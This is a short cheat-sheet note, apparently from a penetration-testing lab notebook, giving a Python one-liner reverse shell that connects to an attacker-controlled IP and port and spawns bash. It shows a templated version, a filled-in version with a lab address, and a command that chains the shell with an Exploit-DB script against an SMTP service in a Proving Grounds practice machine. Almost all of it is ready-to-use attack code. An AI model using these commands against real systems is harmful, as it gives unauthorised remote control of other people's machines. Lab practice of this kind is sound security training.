## Python Reverse Shell

> Note: single quotes were avoided so that it can be wrapped in `'`${SHELL}`'`

Replace `${ATTACKER_IP}` and `${ATTACKER_LISTENER_PORT}` below:

```
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${ATTACKER_IP}\",${ATTACKER_LISTENER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"
```

e.g.

```
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.59\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"
```

Used in practice:

> As in proving-grounds "Bratarina" ([write-up](./../../../write-ups/proving-grounds/warm-up/easy/2024-02-26-Bratarina/README.md)).

```
python /usr/share/exploitdb/exploits/linux/remote/47984.py 192.168.59.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.59\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'
```

